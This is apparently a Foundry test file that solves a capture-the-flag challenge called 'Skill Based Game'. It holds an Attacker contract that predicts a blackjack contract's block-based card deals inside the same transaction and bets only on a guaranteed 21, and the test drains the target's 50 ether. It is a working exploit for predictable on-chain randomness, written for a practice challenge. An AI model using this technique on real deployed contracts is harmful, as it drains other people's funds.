// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Skill Based Game/Challenge.sol";

contract SkillBasedGameTest is Test {
    Challenge challenge;
    address private immutable BLACKJACK = 0xA65D59708838581520511d98fB8b5d1F76A96cad;

    function setUp() public {
        payable(BLACKJACK).transfer(50 ether);
        challenge = new Challenge(BLACKJACK);
    }

    function test_skillBasedGame() public {
        Attacker attacker = new Attacker();

        while (address(BLACKJACK).balance > 0) {
            attacker.play{value: 5 ether}();
        }
        console.log("Balance of blackjack:%e", address(BLACKJACK).balance);
        isSolved();
    }

    function isSolved() public view {
        if (challenge.isSolved()) {
            console.log("Solved");
        } else {
            console.log("Not solved");
        }
    }

    fallback() external payable {}
    receive() external payable {}
}

library Deck {
    function deal(address player, uint8 cardNumber) internal view returns (uint8) {
        uint256 b = block.number;
        uint256 timestamp = block.timestamp;
        return uint8(uint256(keccak256(abi.encodePacked(blockhash(b), player, cardNumber, timestamp))) % 52);
    }

    function valueOf(uint8 card, bool isBigAce) internal pure returns (uint8) {
        uint8 value = card / 4;
        if (value == 0 || value == 11 || value == 12) {
            // Face cards
            return 10;
        }
        if (value == 1 && isBigAce) {
            // Ace is worth 11
            return 11;
        }
        return value;
    }

    function isAce(uint8 card) internal pure returns (bool) {
        return card / 4 == 1;
    }
}

interface BlackJack {
    function deal() external payable;
}

contract Attacker {
    using Deck for *;

    fallback() external payable {}
    receive() external payable {}

    function _calc(uint8[] memory cards) internal view returns (uint8, uint8) {
        uint8 score = 0;
        uint8 scoreBig = 0; // in case of Ace there could be 2 different scores
        bool bigAceUsed = false;
        for (uint256 i = 0; i < cards.length; ++i) {
            uint8 card = cards[i];
            if (Deck.isAce(card) && !bigAceUsed) {
                // doesn't make sense to use the second Ace as 11, because it leads to the losing
                scoreBig += Deck.valueOf(card, true);
                bigAceUsed = true;
            } else {
                scoreBig += Deck.valueOf(card, false);
            }
            score += Deck.valueOf(card, false);
        }
        return (score, scoreBig);
    }

    function play() public payable {
        BlackJack blackjack = BlackJack(0xA65D59708838581520511d98fB8b5d1F76A96cad);

        uint8[] memory dealedCards = new uint8[](2);
        dealedCards[0] = Deck.deal(address(this), 0);
        dealedCards[1] = Deck.deal(address(this), 2);
        (uint8 score, uint8 scoreBig) = _calc(dealedCards);
        if (scoreBig == 21 || score == 21) {
            blackjack.deal{value: 5 ether}();
        } else {
            payable(msg.sender).transfer(msg.value);
        }
    }
}
